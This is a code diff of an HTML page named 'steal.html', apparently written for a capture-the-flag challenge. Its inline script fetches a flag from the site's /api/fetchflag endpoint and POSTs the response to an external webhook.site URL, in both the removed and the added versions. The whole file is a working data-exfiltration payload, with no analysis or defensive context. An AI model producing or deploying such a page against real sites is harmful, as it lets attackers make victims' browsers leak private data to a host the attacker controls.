@@ -1,24 +1,18 @@
+<!-- public/steal.html (or on your external server) -->
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Malicious Page</title>
-</head>
+<head><title>Malicious</title></head>
 <body>
-    <h1>Welcome to My Malicious Page</h1>
-    <script>
-        // Fetch the flag from the server (assuming the server provides an endpoint to fetch the flag)
-        fetch("/api/fetchflag")
-            .then(res => res.text())
-            .then(flag => {
-                // Send the flag to your Webhook URL
-                fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ flag: flag })
-                });
-            });
-    </script>
+<script>
+fetch("/api/fetchflag")
+  .then(res => res.json())
+  .then(data => {
+    fetch("https://webhook.site/0bd8b95b-3b87-4edf-96d6-06a0c337d524", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(data)
+    });
+  });
+</script>
 </body>
 </html>
